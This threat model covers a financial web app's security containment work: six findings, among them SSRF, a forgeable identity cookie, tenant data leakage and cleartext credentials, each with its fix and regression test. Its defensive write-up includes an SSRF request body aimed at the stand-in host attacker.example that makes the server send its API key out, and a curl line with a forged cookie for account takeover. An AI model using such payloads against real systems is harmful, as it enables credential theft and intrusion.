# Threat model — JOB 2 security containment

_Last updated: 2026-08-14 · Scope: containment layer only. The durable fixes for
identity (persistent session store), secrets (external secret manager) and tenant
isolation (database + RLS) land in JOB 3._

**Trust boundary.** Everything arriving over HTTP is attacker-controlled: request
bodies, query strings, headers and cookies. The server, its configuration and its
outbound credentials are trusted. Any code path that lets request data cross into
the trusted side is a finding.

Every issue below was **proven exploitable against the baseline** before being
fixed, and each has a regression test in
`tests/security/containment.test.js` that fails if the control regresses.

---

## T1 — SSRF and server credential forwarding · CRITICAL · FIXED

**Attack path.** `POST /api/monthly-review` accepted `directApiUrl` and `apiKey`
in the request body and passed them to `fetchMonthlyData()`, which called
`fetch()` on the supplied URL. No allowlist, no scheme check, no private-IP
block, and no authentication on the route.

```
POST /api/monthly-review
{ "month": "2026-05", "directApiUrl": "http://attacker.example/steal" }
```

Because the header was built as
`Bearer ${apiKey || config.zohoApiKey}`, **omitting `apiKey` made the server
attach its own `ZOHO_API_KEY`** to the attacker's host.

**Impact.** (a) Server-side request forgery into the internal network and cloud
metadata (`169.254.169.254`), reachable by an unauthenticated caller;
(b) exfiltration of the platform's Zoho credential; (c) attacker-controlled JSON
being parsed and returned as the user's financial analysis.

**Exploitability.** Trivial. No authentication, no special tooling — a single
curl. Confirmed: the test listener received `GET /steal?month=2026-05`.

**Remediation.** The endpoint and credential now come from server configuration
only; both parameters are refused at the route and removed from the
`fetchMonthlyData` signature (defence in depth).
`src/services/zohoClient.js`, `src/routes/api.js`.

**Regression test.** `[T1]`, `[T1b]` — a local sink server must receive zero
requests; metadata content must never appear in a response.

---

## T2 — Forgeable identity cookie · CRITICAL · FIXED

**Attack path.** `getUserId()` trusted the raw value of the `fg_google_sub`
cookie when no session existed. `cookieParser()` was initialised without a
secret, so nothing was signed.

```
curl -H 'Cookie: fg_google_sub=<victim google sub>' https://host/api/profile
```

A Google `sub` is **not a secret** — it is a stable public identifier that this
API returns from `/auth/session` and uses as an on-disk directory name.

**Impact.** Full account takeover: read/write another tenant's financial data,
profile, plan and credits; overwrite their stored API key; and — via
`/auth/session`, which copied the forged value into `req.session.googleUser` —
launder the forgery into a real server-side session.

**Exploitability.** Trivial once a `sub` is known, and `sub` values are not
protected anywhere in the product.

**Remediation.** All identity cookies are now **signed** with the session secret
and read exclusively from `req.signedCookies`, so a forged or tampered value is
simply absent. The `SESSION_SECRET` fallback literal is gone: production refuses
to boot without one, and development uses an ephemeral random secret.
`src/server.js`, `src/routes/api.js`.

**Accepted cost.** Existing sessions are invalidated once (users sign in again).
Per invariant 24, security takes priority over backwards compatibility.

**Residual risk.** Sessions still live in `MemoryStore`, so a restart logs
everyone out. The unsigned cookie existed to paper over exactly this. The proper
fix — a persistent session store — is JOB 3. **NOT RESOLVED.**

**Regression test.** `[T2]`, `[T2b]`, `[T2c]`.

---

## T3 — Forged workspace id creates server state · HIGH · FIXED

**Attack path.** `resolveCollabWorkspace()` took `workspace` from the query
string / body and called `getUserStoreById(ownerId)` **before** the membership
check. That function unconditionally created an in-memory entry and a directory
on disk.

**Impact.** Unauthenticated, unbounded resource exhaustion — one `Map` entry and
one directory per request, never evicted. On the free hosting tier this fills the
disk and OOMs the process. (Data reads were already correctly refused with
`403 not_a_member`, so this was denial of service, not an IDOR.)

**Exploitability.** Trivial; a loop over random identifiers. Confirmed: 5 forged
ids created 6 directories.

**Remediation.** `userStoreExists()` refuses unknown identifiers before any state
is materialised, applied at all three caller-supplied entry points
(`findings/thread`, `findings/comment`, `findings/resolve`) plus the membership
scan and invite acceptance. `src/routes/api.js`.

**Regression test.** `[T3c]` — no directory may be created for a forged id.

---

## T4 — Cross-tenant financial contamination · CRITICAL · FIXED

**Attack path.** Not an external attack — a design defect with the same
consequences. `onchainLedger.js` and `contractDeploymentHistory.js` wrote to a
**single global file** at the reports root rather than per-tenant paths.

**Impact.** (a) Every tenant could read every other tenant's wallet addresses,
counterparty addresses, transaction hashes and amounts; (b) worse,
`summarizeMonth()` fed that shared ledger into each tenant's **monthly financial
analysis**, so one business's on-chain movements altered another's reported cash
position. A correctness failure as much as a privacy one.

**Exploitability.** Automatic — no attacker required. Any two tenants using
on-chain features contaminated each other.

**Remediation.** Both modules now require an explicit tenant directory and throw
without one. `buildContext()` takes `reportsDir` and passes it to
`summarizeMonth`; with no tenant scope it reports `scope: "unavailable"` rather
than reading a shared file. All call sites updated.

**Regression test.** Covered indirectly by `[T3]`. **A direct cross-tenant ledger
test is still missing — NOT VERIFIED.** It needs two authenticated tenants with
on-chain writes, which is easier once JOB 3 provides real fixtures.

---

## T5 — Credentials in cleartext at rest · CRITICAL · PARTIALLY CONTAINED

**Attack path.** Profiles are persisted as JSON. `aiApiKey`, `zohoApiKey` and
`zohoRefreshToken` were written verbatim to
`data/reports/<user>/profile.json`. Any process running as the app user, and any
backup, `rsync` or container layer copying `data/`, obtains live credentials.

**Impact.** Compromise of customer AI provider accounts and — via the long-lived
Zoho **refresh** token scoped `ZohoBooks.fullaccess.all` — of their accounting
system.

**Exploitability.** No exploit needed; read the file. The audit found real
credentials present in the working tree.

**Remediation (containment).** `src/services/secretStore.js` encrypts these
fields with AES-256-GCM (key derived from `SECRETS_KEY` via scrypt) on write and
decrypts on read. Legacy cleartext is still readable and is upgraded on the next
write. Production refuses to persist a credential when `SECRETS_KEY` is unset;
development warns loudly. `npm run secrets:scan` fails CI if any tracked file or
persisted profile holds a cleartext credential.

**⚠️ Still required — not something code can do.** Encryption does not un-leak an
already-exposed secret. **The xAI key and Zoho refresh token found in the working
tree must be rotated/revoked by their owner.** Until then this remains **OPEN**.

**Residual risk.** `SECRETS_KEY` lives in the environment beside the data it
protects — this raises the bar, it does not separate custody. JOB 3 replaces it
with secret *references* backed by a real secret manager.

**Regression test.** `[T6]` plus `npm run secrets:scan`.

---

## T6 — Internal error disclosure · MEDIUM · FIXED

**Attack path.** Route handlers returned `error.message` directly, e.g.
`res.status(500).json({ ok: false, error: error.message })`, exposing filesystem
paths, upstream provider text and stack fragments. The SSRF probe against cloud
metadata returned a raw upstream error after a 10-second hang.

**Impact.** Information disclosure aiding further attacks; upstream error text
may itself contain sensitive data.

**Remediation.** A single `serverError()` helper logs the detail server-side and
returns an opaque `{ error: "internal_error" }`. OAuth failures redirect with a
fixed `google_auth_failed` code instead of reflecting upstream text.

**Regression test.** `[T5]` — no paths, `at Object.`, `node_modules` or `.js:NN`
in any 5xx body.

---

## Known gaps after JOB 2 — explicitly NOT fixed

| Gap | Why deferred |
|---|---|
| Sessions in `MemoryStore` | Needs the persistent store from JOB 3 |
| Secrets share custody with the app | Needs a secret manager (JOB 3) |
| `safeDirName()` is lossy (strips rather than escapes → possible collision) | Directory naming disappears when Postgres lands (JOB 3) |
| No rate limiting on any endpoint | JOB 12 hardening |
| No CSRF protection on state-changing routes | JOB 12; cookies are `sameSite: lax`, which mitigates but does not eliminate |
| No direct cross-tenant ledger regression test | Needs multi-tenant fixtures (JOB 3) |
| Compromised credentials not rotated | Requires owner action |
